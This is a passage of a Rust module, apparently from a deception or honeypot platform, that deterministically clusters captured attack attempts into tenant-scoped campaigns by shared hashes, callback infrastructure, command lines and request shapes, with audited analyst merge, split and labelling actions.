//! Campaigns (#33): attempts (#25) clustered across decoys and sensors by
//! shared infrastructure, TTPs, targeting and payloads, kept as one
//! first-class object per cluster.
//!
//! Deterministic and explainable: the same attempts, IOCs (#34), signals
//! and analyst actions always give the same campaigns, ids and evidence, in
//! any input order. Every member lists the features that joined it, and
//! every campaign is scored with the confidence layer (#27), worded
//! "possible" until an analyst confirms it.
//!
//! Cost is bounded. Each attempt yields at most
//! [`MAX_FEATURES_PER_ATTEMPT`] join keys; attempts are blocked on those
//! keys in an inverted index and joined with union-find, so the work is
//! linear in (attempt, key) pairs and never pairwise over attempts.
//!
//! Tenant-scoped: attempts from any other tenant are ignored. There is no
//! fleet (cross-tenant) scope yet; see `docs/campaigns.md`. Actor
//! possible-association (#29) attaches to `suggested_actor_links`, which
//! clustering never fills.
//!
//! Contract: `schemas/campaign.schema.json` and
//! `schemas/campaign-action.schema.json`.

use std::collections::{BTreeMap, BTreeSet};

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::alerting::{Alert, AlertType, Link, LinkKind as AlertLinkKind, Severity};
use crate::attack::AttackRule;
use crate::attempt::{Attempt, AttemptState, NoiseBand};
use crate::capture::CaptureEvent;
use crate::confidence::{
    Band, ConfidenceConfig, ConfidenceLink, Evidence, EvidenceSource, Feedback, LinkKind, Override,
    score,
};
use crate::cvemap::Rules;
use crate::ioc::{Extraction, Ioc, IocRole, IocType, defang};
use crate::timeline::printable;

const HOUR_MS: i64 = 3_600_000;
const DAY_MS: i64 = 24 * HOUR_MS;

/// Attempts sharing a key join only when the later one starts within this
/// long of the earlier one ending.
pub const DEFAULT_JOIN_GAP_MS: i64 = 7 * DAY_MS;
/// A campaign with no new attempt for this long is `closed`.
pub const DEFAULT_CLOSED_AFTER_MS: i64 = 7 * DAY_MS;
/// Most join keys taken from one attempt, strongest first.
pub const MAX_FEATURES_PER_ATTEMPT: usize = 64;
/// Most joins listed per member. Every join still counts for clustering.
pub const MAX_JOINS_PER_MEMBER: usize = 8;
/// Most values listed per feature in `feature_summary`.
pub const MAX_SUMMARY_VALUES: usize = 16;
/// Most IOC ids listed in `shared_ioc_ids`.
pub const MAX_SHARED_IOCS: usize = 64;
/// Most clustering evidence items scored per campaign.
pub const MAX_CONFIDENCE_ITEMS: usize = 16;
/// Most request shapes (path and user agent pairs) taken from one attempt.
pub const MAX_REQUEST_SHAPES: usize = 4;
/// Most feedback actions replayed per tenant (the newest are kept).
/// Structural actions (label, status, merge, split) are always replayed.
pub const MAX_FEEDBACK_ACTIONS: usize = 500;
/// Most anchor attempts stored with an action or merge reference.
pub const MAX_ANCHORS: usize = 16;
/// Most `merged_into` hops followed in the registry.
pub const MAX_MERGE_HOPS: usize = 8;
/// Most join keys of one feature kept per attempt.
pub const MAX_KEYS_PER_FEATURE: usize = 16;
/// A medium feature held by more distinct sources than this is common
/// (a public exploit or tool) and only joins as weak.
pub const COMMON_MAX_SOURCES: usize = 10;
/// In a window with at least this many sources, a medium feature held by
/// more than a quarter of them is common too.
pub const COMMON_MIN_POPULATION: usize = 8;
/// One source's attempts may not be the only join between two parts of a
/// cluster that each hold at least this many attempts.
pub const BRIDGE_MIN_ATTEMPTS: usize = 3;
/// Most bridge provenance records kept per merge.
pub const MAX_BRIDGE_RECORDS: usize = 16;
/// Most per-attempt key cap notes listed.
const MAX_CAP_NOTES: usize = 32;
/// Longest analyst title, in characters.
pub const MAX_TITLE_CHARS: usize = 120;
/// Longest analyst note, in characters.
pub const MAX_NOTE_CHARS: usize = 1000;
/// Most attempt ids one split action may name.
pub const MAX_ACTION_ATTEMPTS: usize = 500;
/// Most campaigns one merge action may fold in.
pub const MAX_ACTION_CAMPAIGNS: usize = 20;
/// Version of the campaign id derivation.
pub const ID_VERSION: u32 = 1;

const ID_DOMAIN: &str = "foiled-campaign/v1";
/// Characters of a feature value shown in a generated title.
const TITLE_VALUE_CHARS: usize = 40;
/// SHA-256 of nothing: every empty body has it, so it joins nothing.
const EMPTY_SHA256: &str = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855";

// ---------------------------------------------------------------------------
// Features
// ---------------------------------------------------------------------------

/// A join key kind. Declaration order is strength order (strong first).
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Feature {
    /// Same SHA-256 of what was sent to the decoy (`payload_sha256` IOC).
    PayloadSha256,
    /// Same SHA-256 of a file the attacker left (`file_sha256` IOC).
    FileSha256,
    /// Same second-stage or callback URL.
    Stage2Url,
    /// Same callback or second-stage host name (domain or DNS query IOC).
    CallbackDomain,
    /// Same callback or second-stage address.
    CallbackIp,
    /// Same behaviour fingerprint (`bf2:`), exploit or later only.
    BehaviourFingerprint,
    /// Same command line.
    Cmdline,
    /// Same exact request string, exploit or later only.
    RequestSubstring,
    /// Same source address, both attempts at exploit or later.
    SrcIp,
    /// Same source ASN and the same CVE, exploit or later.
    AsnCve,
    /// Same source ASN and the same ATT&CK technique set, exploit or later.
    AsnTechniques,
    /// Same request path and user agent, exploit or later.
    RequestShape,
}

/// How much a feature says on its own.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Strength {
    /// An artefact that is hard to share by chance: a hash, a stage-2 URL,
    /// callback infrastructure.
    Strong,
    /// Overlapping behaviour that a public exploit can also explain.
    Medium,
    /// Two weak facts at once. Never bridges two clusters that strong or
    /// medium features already formed.
    Weak,
}

impl Strength {
    /// Evidence weight for the confidence layer (#27).
    pub fn weight(self) -> u8 {
        match self {
            Strength::Strong => 100,
            Strength::Medium => 70,
            Strength::Weak => 40,
        }
    }
}

/// The issue's four feature families.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Family {
    Infrastructure,
    Ttp,
    Targeting,
    Payload,
}

impl Feature {
    pub const ALL: [Feature; 12] = [
        Feature::PayloadSha256,
        Feature::FileSha256,
        Feature::Stage2Url,
        Feature::CallbackDomain,
        Feature::CallbackIp,
        Feature::BehaviourFingerprint,
        Feature::Cmdline,
        Feature::RequestSubstring,
        Feature::SrcIp,
        Feature::AsnCve,
        Feature::AsnTechniques,
        Feature::RequestShape,
    ];

    pub fn as_str(self) -> &'static str {
        match self {
            Feature::PayloadSha256 => "payload_sha256",
            Feature::FileSha256 => "file_sha256",
            Feature::Stage2Url => "stage2_url",
            Feature::CallbackDomain => "callback_domain",
            Feature::CallbackIp => "callback_ip",
            Feature::BehaviourFingerprint => "behaviour_fingerprint",
            Feature::Cmdline => "cmdline",
            Feature::RequestSubstring => "request_substring",
            Feature::SrcIp => "src_ip",
            Feature::AsnCve => "asn_cve",
            Feature::AsnTechniques => "asn_techniques",
            Feature::RequestShape => "request_shape",
        }
    }

    pub fn strength(self) -> Strength {
        match self {
            Feature::PayloadSha256
            | Feature::FileSha256
            | Feature::Stage2Url
            | Feature::CallbackDomain
            | Feature::CallbackIp => Strength::Strong,
            Feature::BehaviourFingerprint | Feature::Cmdline | Feature::RequestSubstring => {
                Strength::Medium
            }
            Feature::SrcIp | Feature::AsnCve | Feature::AsnTechniques | Feature::RequestShape => {
                Strength::Weak
            }
        }
    }

    pub fn families(self) -> &'static [Family] {
        match self {
            Feature::PayloadSha256
            | Feature::FileSha256
            | Feature::RequestSubstring
            | Feature::RequestShape => &[Family::Payload],
            Feature::Stage2Url | Feature::CallbackDomain | Feature::CallbackIp | Feature::SrcIp => {
                &[Family::Infrastructure]
            }
            Feature::BehaviourFingerprint | Feature::Cmdline => &[Family::Ttp],
            Feature::AsnCve => &[Family::Infrastructure, Family::Targeting],
            Feature::AsnTechniques => &[Family::Infrastructure, Family::Ttp],
        }
    }

    /// Words for summaries and titles.
    pub fn label(self) -> &'static str {
        match self {
            Feature::PayloadSha256 => "payload hash",
            Feature::FileSha256 => "file hash",
            Feature::Stage2Url => "stage-2 URL",
            Feature::CallbackDomain => "callback domain",
            Feature::CallbackIp => "callback address",
            Feature::BehaviourFingerprint => "behaviour fingerprint",
            Feature::Cmdline => "command line",
            Feature::RequestSubstring => "request string",
            Feature::SrcIp => "source address",
            Feature::AsnCve => "ASN and CVE",
            Feature::AsnTechniques => "ASN and technique set",
            Feature::RequestShape => "request shape",
        }
    }
}

/// What the clustering knows about one attempt beyond the attempt itself,
/// computed from its events by [`attempt_signals`].
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct AttemptSignals {
    /// CVE ids from CVE mapping tiers 1, 2 and 5 (#12). Hook hit CVEs are
    /// read from the attempt.
    pub cves: BTreeSet<String>,
    /// ATT&CK technique ids from the bundled rules (#26).
    pub techniques: BTreeSet<String>,
}

/// CVE and technique sets per attempt id, from the same rule packs the
/// confidence links use. Linear in events times rules.
pub fn attempt_signals(
    attempts: &[Attempt],
    events: &[CaptureEvent],
    attack_rules: &[AttackRule],
    cve_rules: &Rules,
) -> BTreeMap<String, AttemptSignals> {
    let by_id: BTreeMap<&str, &CaptureEvent> =
        events.iter().map(|e| (e.event_id.as_str(), e)).collect();
    let mut out = BTreeMap::new();
    for a in attempts {
        let mine: Vec<CaptureEvent> = a
            .event_ids
            .iter()
            .filter_map(|id| by_id.get(id.as_str()).map(|e| (*e).clone()))
            .collect();
        let tiers = crate::cvemap::evaluate(cve_rules, &mine, &[]);
        // ATT&CK rules see which signatures matched as `data.matcher_id`,
        // as in the confidence links.
        let annotated: Vec<CaptureEvent> = mine
            .into_iter()
            .map(|mut e| {
                if let Some(ids) = tiers.matcher_hits.get(&e.event_id) {
                    e.data
                        .insert("matcher_id".into(), serde_json::Value::from(ids[0].clone()));
                }
                e
            })
            .collect();
        let techniques = crate::attack::evaluate(attack_rules, &annotated)
            .iter()
            .map(|l| l.official_id().to_string())
            .collect();
        out.insert(
            a.attempt_id.clone(),
            AttemptSignals {
                cves: tiers.evidence.into_keys().collect(),
                techniques,
            },
        );
    }
    out
}

// ---------------------------------------------------------------------------
// The campaign object
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum CampaignStatus {
    /// Low confidence or fewer than three attempts.
    Emerging,
    Active,
    /// No new attempt for [`Params::closed_after_ms`], or closed by an analyst.
    Closed,
}

impl CampaignStatus {
    pub fn as_str(self) -> &'static str {
        match self {
            CampaignStatus::Emerging => "emerging",
            CampaignStatus::Active => "active",
            CampaignStatus::Closed => "closed",
        }
    }
}

/// Who may see the campaign. Only `tenant` exists: a fleet scope for shared
/// research sensors needs an explicit research operator first.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum TenantScope {
    Tenant,
}

/// One feature that joined a member to another member.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Join {
    /// `campaign:<feature>:<hash>`, the confidence evidence id.
    pub signal_id: String,
    pub feature: Feature,
    pub families: Vec<Family>,
    pub strength: Strength,
    pub weight: u8,
    /// Defanged and escaped for people. Never parse this.
    pub display: String,
    /// The member this one shares the feature with (its neighbour in time).
    pub with_attempt_id: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub ioc_id: Option<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ActionKind {
    /// Set the campaign title.
    Label,
    /// Set or clear a status override.
    Status,
    /// Fold other campaigns into this one.
    Merge,
    /// Move attempts out into a campaign of their own.
    Split,
    /// Confirm (`true_positive`), reject or comment on the campaign (#27).
    Feedback,
}

impl ActionKind {
    pub fn as_str(self) -> &'static str {
        match self {
            ActionKind::Label => "label",
            ActionKind::Status => "status",
            ActionKind::Merge => "merge",
            ActionKind::Split => "split",
            ActionKind::Feedback => "feedback",
        }
    }
}

/// Set on a member that is in the campaign because of an analyst action.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct AddedBy {
    pub action_id: String,
    pub kind: ActionKind,
    pub analyst_id: String,
    pub at: i64,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Member {
    pub attempt_id: String,
    pub decoy_id: String,
    pub catalogue_id: String,
    pub sensor_id: Option<String>,
    pub src: String,
    pub first_seen: i64,
    pub last_seen: i64,
    pub state: AttemptState,
    pub noise_score: Option<u8>,
    /// Up to [`MAX_JOINS_PER_MEMBER`] features shared with other members,
    /// strongest first.
    pub joined_by: Vec<Join>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub added_by: Option<AddedBy>,
    /// In the campaign from an earlier window (the campaign registry): the
    /// attempts it joined are outside this window.
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub carried_over: bool,
}

/// The attempt the campaign id is derived from, and what joined it.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Seed {
    pub attempt_id: String,
    pub features: Vec<Feature>,
}

/// Distinct values of one feature, display-safe.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Counted {
    pub count: u32,
    /// Up to [`MAX_SUMMARY_VALUES`], sorted. Defanged and escaped.
    pub values: Vec<String>,
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct InfrastructureSummary {
    /// Every member's source address.
    pub src_ips: Counted,
    /// Every member source's ASN, where enrichment knows it (#11).
    pub asns: Vec<u32>,
    pub stage2_urls: Counted,
    pub callback_domains: Counted,
    pub callback_ips: Counted,
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct TtpSummary {
    /// ATT&CK technique ids seen on any member (#26).
    pub techniques: Vec<String>,
    pub behaviour_fingerprints: Counted,
    pub cmdlines: Counted,
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct PayloadSummary {
    pub payload_sha256: Counted,
    pub file_sha256: Counted,
    pub request_substrings: Counted,
    pub request_shapes: Counted,
}

/// Mass versus selective targeting (`docs/campaigns.md#targeting-pattern`).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum TargetingPattern {
    Mass,
    Mixed,
    Selective,
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct NoiseBands {
    pub targeted: u32,
    pub mixed: u32,
    pub mass: u32,
    pub unknown: u32,
}

/// When the campaign hit a CVE relative to its advisory (#12).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct AdvisoryTiming {
    pub cve_id: String,
    pub published_at: i64,
    /// First member attempt with this CVE.
    pub first_seen: i64,
    /// Whole hours from publication to `first_seen`; negative before it.
    pub offset_hours: i64,
    pub before_disclosure: bool,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Targeting {
    pub pattern: TargetingPattern,
    pub attempts: u32,
    pub sources: u32,
    pub decoys_touched: u32,
    pub sensors_touched: u32,
    pub products_touched: u32,
    /// Decoys with attacker-facing traffic in the window that run a product
    /// the campaign touched.
    pub visible_decoys: u32,
    /// `decoys_touched` as a percentage of `visible_decoys`.
    pub coverage_pct: u8,
    pub noise_bands: NoiseBands,
    pub catalogue_ids: Vec<String>,
    pub cves: Vec<String>,
    pub advisory_timing: Vec<AdvisoryTiming>,
    /// Every reason for `pattern`, in words.
    pub evidence: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct FeatureSummary {
    pub infrastructure: InfrastructureSummary,
    pub ttp: TtpSummary,
    pub targeting: Targeting,
    pub payload: PayloadSummary,
}

/// The #27 score for the campaign, condensed from a `ConfidenceLink` of
/// kind `attempt_campaign` (attempt: the seed, target: the campaign).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct CampaignConfidence {
    pub score: u8,
    pub band: Band,
    pub wording: String,
    pub publishable: bool,
    pub evidence: Vec<Evidence>,
    pub caps_applied: Vec<String>,
}

/// Attachment point for actor possible-association (#29). Clustering never
/// fills this; #29 does, through #27, with "possible association" wording
/// unless an analyst confirms a high link.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ActorSuggestion {
    pub label: String,
    pub wording: String,
    pub confidence_ref: String,
    pub report_urls: Vec<String>,
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct AnalystState {
    /// Escaped analyst title, when one was set.
    pub title: Option<String>,
    /// Status override, when one was set.
    pub status: Option<CampaignStatus>,
    /// The latest feedback on the campaign (#27).
    pub feedback: Option<Override>,
    /// Campaign ids folded into this one by merges.
    pub merged_from: Vec<String>,
    /// The campaign this one was split out of.
    pub split_from: Option<String>,
    /// Actions applied, oldest first.
    pub action_ids: Vec<String>,
}

/// One campaign. Mirrors `schemas/campaign.schema.json`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Campaign {
    /// `cmp_` plus 24 hex characters (see [`campaign_id`]).
    pub campaign_id: String,
    pub tenant_id: String,
    pub tenant_scope: TenantScope,
    /// Escaped. An analyst title when set, otherwise generated.
    pub title: String,
    pub status: CampaignStatus,
    pub first_seen: i64,
    pub last_seen: i64,
    pub seed: Seed,
    /// Every member, oldest first.
    pub attempt_ids: Vec<String>,
    pub decoy_ids: Vec<String>,
    pub sensor_ids: Vec<String>,
    pub catalogue_ids: Vec<String>,
    pub members: Vec<Member>,
    pub feature_summary: FeatureSummary,
    /// IOC ids seen in at least two members (#34).
    pub shared_ioc_ids: Vec<String>,
    /// Where the full #27 explanation lives.
    pub confidence_ref: String,
    pub confidence: CampaignConfidence,
    /// Reserved for #29. Always empty from clustering.
    pub suggested_actor_links: Vec<ActorSuggestion>,
    pub analyst: AnalystState,
    /// Links refused because one source alone made them (see
    /// [`BRIDGE_MIN_ATTEMPTS`]). An analyst may merge.
    pub possible_links: Vec<PossibleLink>,
    /// Provenance of recorded campaigns folded into this one in this read.
    /// Earlier ones are served with the evidence.
    pub bridges: Vec<BridgeRecord>,
    pub notes: Vec<String>,
}

/// A campaign named by an analyst action. Actions resolve by campaign id
/// first (the registry keeps ids stable across windows) and fall back to
/// the anchor attempts, a few of the campaign's newest members when the
/// action was taken.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct CampaignRef {
    pub campaign_id: String,
    pub anchor_attempt_ids: Vec<String>,
}

/// One audited analyst action. Mirrors `schemas/campaign-action.schema.json`.
/// Actions are stored, never edited, and replayed in `(at, action_id)` order
/// over the computed clustering.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct CampaignAction {
    pub action_id: String,
    pub kind: ActionKind,
    pub campaign_id: String,
    /// Up to [`MAX_ANCHORS`] member attempts, newest first, used only when
    /// `campaign_id` is not in the window.
    pub anchor_attempt_ids: Vec<String>,
    /// `label`: the new title.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub title: Option<String>,
    /// `status`: the override; absent clears it.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub status: Option<CampaignStatus>,
    /// `merge`: campaigns to fold in.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub merge: Vec<CampaignRef>,
    /// `split`: attempts to move out.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub attempt_ids: Vec<String>,
    /// `feedback`: the decision.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub feedback: Option<Feedback>,
    pub note: String,
    pub analyst_id: String,
    pub at: i64,
}

impl CampaignAction {
    /// Problems with the action's own fields. The API also checks that the
    /// campaigns and attempts it names exist.
    pub fn problems(&self) -> Vec<String> {
        let mut out = Vec::new();
        if self.note.chars().count() > MAX_NOTE_CHARS {
            out.push(format!("note must be at most {MAX_NOTE_CHARS} characters"));
        }
        if self.anchor_attempt_ids.len() > MAX_ANCHORS
            || self
                .merge
                .iter()
                .any(|r| r.anchor_attempt_ids.len() > MAX_ANCHORS)
        {
            out.push(format!("at most {MAX_ANCHORS} anchor attempts"));
        }
        let want = |ok: bool, what: &str, out: &mut Vec<String>| {
            if !ok {
                out.push(format!("{} needs {what}", self.kind.as_str()));
            }
        };
        let only = |present: bool, field: &str, kind: ActionKind, out: &mut Vec<String>| {
            if present && self.kind != kind {
                out.push(format!("{field} is only for {}", kind.as_str()));
            }
        };
        only(self.title.is_some(), "title", ActionKind::Label, &mut out);
        only(
            self.status.is_some(),
            "status",
            ActionKind::Status,
            &mut out,
        );
        only(
            !self.merge.is_empty(),
            "campaign_ids",
            ActionKind::Merge,
            &mut out,
        );
        only(
            !self.attempt_ids.is_empty(),
            "attempt_ids",
            ActionKind::Split,
            &mut out,
        );
        only(
            self.feedback.is_some(),
            "feedback",
            ActionKind::Feedback,
            &mut out,
        );
        match self.kind {
            ActionKind::Label => {
                let t = self.title.as_deref().unwrap_or("").trim();
                want(!t.is_empty(), "a title", &mut out);
                if t.chars().count() > MAX_TITLE_CHARS {
                    out.push(format!(
                        "title must be at most {MAX_TITLE_CHARS} characters"
                    ));
                }
            }
            ActionKind::Status => {}
            ActionKind::Merge => {
                want(!self.merge.is_empty(), "campaign_ids", &mut out);
                if self.merge.len() > MAX_ACTION_CAMPAIGNS {
                    out.push(format!(
                        "merge takes at most {MAX_ACTION_CAMPAIGNS} campaigns"
                    ));
                }
            }
            ActionKind::Split => {
                want(!self.attempt_ids.is_empty(), "attempt_ids", &mut out);
                if self.attempt_ids.len() > MAX_ACTION_ATTEMPTS {
                    out.push(format!(
                        "split takes at most {MAX_ACTION_ATTEMPTS} attempts"
                    ));
                }
            }
            ActionKind::Feedback => want(self.feedback.is_some(), "feedback", &mut out),
        }
        out
    }

    /// Merge, split, label and status change what a campaign is and are
    /// always replayed in full. Only feedback may be capped.
    pub fn is_structural(&self) -> bool {
        self.kind != ActionKind::Feedback
    }
}

/// A campaign as the registry last recorded it.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct StoredCampaign {
    pub campaign_id: String,
    /// Unix ms when the id was first recorded. The oldest id wins when a
    /// cluster holds members of several stored campaigns.
    pub created_at: i64,
    pub first_seen: i64,
    pub last_seen: i64,
    /// Set when the campaign was folded into another (merge or a new bridge).
    pub merged_into: Option<String>,
    /// Attempts recorded as members, across all windows.
    pub attempts: u32,
}

/// The stored campaign registry, as read for one window: the recorded
/// campaign of each attempt in the window and the records of those
/// campaigns (and of any campaign they were merged into).
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Registry {
    /// Attempt id to recorded campaign id.
    pub members: BTreeMap<String, String>,
    pub campaigns: BTreeMap<String, StoredCampaign>,
    /// Bridge provenance, kept by the in-memory store and tests. The API
    /// reads it per campaign from the store.
    pub bridges: Vec<BridgeRecord>,
}

/// Which attempts and feature joined two groups into one campaign, for
/// every merge the registry makes permanent (strong or medium features
/// only). Kept so the join stays explainable, and auditable, after the
/// bridge has left the window.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct BridgeRecord {
    /// The campaign the merge was recorded in (the surviving one).
    pub campaign_id: String,
    /// The recorded campaign folded into it, when the other side had one;
    /// null when two groups merged before either was recorded.
    pub merged_campaign_id: Option<String>,
    /// The bridging attempt, on the surviving side.
    pub attempt_id: String,
    /// The attempt it shares the feature with, on the other side.
    pub with_attempt_id: String,
    pub signal_id: String,
    pub feature: Feature,
    /// Attempts on each side when they joined.
    pub attempt_side: u32,
    pub with_side: u32,
    /// True when one side held fewer than [`BRIDGE_MIN_ATTEMPTS`]
    /// attempts, below what the forged-bridge guard checks: audit these.
    pub small_halves: bool,
    pub recorded_at: i64,
}

/// A link clustering refused: one source's attempts were the only thing
/// joining two campaigns that each have at least [`BRIDGE_MIN_ATTEMPTS`]
/// attempts. Shown for an analyst, who may merge.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct PossibleLink {
    /// The other campaigns the source's attempts also touched.
    pub other_campaign_ids: Vec<String>,
    /// The single source's attempts that made the link, now in this one.
    pub attempt_ids: Vec<String>,
    /// Defanged.
    pub src: String,
    /// The shared features (campaign evidence ids).
    pub signal_ids: Vec<String>,
}

impl Registry {
    /// `(created_at, id)`: the order `merged_into` must follow (always to a
    /// strictly older campaign). Unknown campaigns sort last.
    fn rank<'a>(&self, id: &'a str) -> (i64, &'a str) {
        (
            self.campaigns.get(id).map_or(i64::MAX, |c| c.created_at),
            id,
        )
    }

    /// Follow `merged_into` to the live id, at most [`MAX_MERGE_HOPS`]
    /// hops. Stores only ever point `merged_into` at a strictly older
    /// campaign, so chains cannot loop; if a cycle is found anyway (data
    /// written before that rule), the oldest campaign in it is the answer,
    /// whichever member the walk started from.
    pub fn resolve<'a>(&'a self, id: &'a str) -> &'a str {
        let mut seen: Vec<&'a str> = vec![id];
        let mut cur = id;
        for _ in 0..MAX_MERGE_HOPS {
            let Some(next) = self
                .campaigns
                .get(cur)
                .and_then(|c| c.merged_into.as_deref())
            else {
                return cur;
            };
            if let Some(pos) = seen.iter().position(|s| *s == next) {
                return seen[pos..]
                    .iter()
                    .copied()
                    .min_by(|a, b| self.rank(a).cmp(&self.rank(b)))
                    .unwrap_or(next);
            }
            seen.push(next);
            cur = next;
        }
        cur
    }

    /// Apply an update the way the stores do, so concurrent or stale
    /// writers converge in any order: `created_at` is set on insert and
    /// never changed, first and last seen only widen, `merged_into` is
    /// write-once and only ever points at a strictly older campaign by
    /// `(created_at, id)` (so no cycle can form), and a membership only
    /// moves to an older campaign. `attempts` is recounted. Used by the
    /// in-memory store and tests; the Postgres store does the same in SQL
    /// and triggers.
    pub fn apply(&mut self, up: &RegistryUpdate) {
        // Rows first, without merges, as the SQL upsert does.
        for c in &up.campaigns {
            match self.campaigns.get_mut(&c.campaign_id) {
                Some(s) => {
                    s.first_seen = s.first_seen.min(c.first_seen);
                    s.last_seen = s.last_seen.max(c.last_seen);
                }
                None => {
                    self.campaigns.insert(
                        c.campaign_id.clone(),
                        StoredCampaign {
                            merged_into: None,
                            ..c.clone()
                        },
                    );
                }
            }
        }
        // Then merges, each checked against the stored rows.
        for c in &up.campaigns {
            let Some(into) = c.merged_into.as_deref() else {
                continue;
            };
            let ok = self
                .campaigns
                .get(&c.campaign_id)
                .is_some_and(|s| s.merged_into.is_none())
                && self.campaigns.contains_key(into)
                && self.rank(into) < self.rank(&c.campaign_id)
                && self.resolve(into) != c.campaign_id;
            if ok && let Some(s) = self.campaigns.get_mut(&c.campaign_id) {
                s.merged_into = Some(into.to_string());
            }
        }
        for m in &up.members {
            let rank = |id: &str| {
                self.campaigns
                    .get(id)
                    .map(|c| (c.created_at, id.to_string()))
            };
            let moves = match self.members.get(&m.attempt_id) {
                None => true,
                Some(old) if *old == m.campaign_id => false,
                Some(old) => match (rank(&m.campaign_id), rank(old)) {
                    (Some(new), Some(old)) => new < old,
                    (Some(_), None) => true,
                    _ => false,
                },
            };
            if moves {
                self.members
                    .insert(m.attempt_id.clone(), m.campaign_id.clone());
            }
        }
        // Provenance only for merges that were applied: the folded
        // campaign now points here, or both attempts are recorded here.
        for b in &up.bridges {
            let applied = match &b.merged_campaign_id {
                Some(from) => {
                    self.campaigns
                        .get(from)
                        .and_then(|c| c.merged_into.as_deref())
                        == Some(b.campaign_id.as_str())
                        || [&b.attempt_id, &b.with_attempt_id]
                            .iter()
                            .all(|a| self.members.get(*a) == Some(&b.campaign_id))
                }
                None => [&b.attempt_id, &b.with_attempt_id]
                    .iter()
                    .all(|a| self.members.get(*a) == Some(&b.campaign_id)),
            };
            if applied && !self.bridges.contains(b) {
                self.bridges.push(b.clone());
            }
        }
        let mut counts: BTreeMap<&str, u32> = BTreeMap::new();
        for c in self.members.values() {
            *counts.entry(c.as_str()).or_default() += 1;
        }
        let counts: BTreeMap<String, u32> = counts
            .into_iter()
            .map(|(k, v)| (k.to_string(), v))
            .collect();
        for (id, c) in self.campaigns.iter_mut() {
            c.attempts = counts.get(id).copied().unwrap_or(0);
        }
    }

    /// `merged_into` targets not loaded yet, for the caller to fetch.
    pub fn missing_targets(&self) -> Vec<String> {
        self.campaigns
            .values()
            .filter_map(|c| c.merged_into.clone())
            .filter(|t| !self.campaigns.contains_key(t))
            .collect::<BTreeSet<_>>()
            .into_iter()
            .collect()
    }
}

/// One recorded membership.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MemberRecord {
    pub attempt_id: String,
    pub campaign_id: String,
    pub attempt_first_seen: i64,
}

/// What a clustering run changes in the registry. Empty when nothing
/// changed, which is the steady state.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct RegistryUpdate {
    /// Upserts. `attempts` is ignored; the store counts members itself.
    pub campaigns: Vec<StoredCampaign>,
    pub members: Vec<MemberRecord>,
    /// Provenance of the merges in `campaigns`.
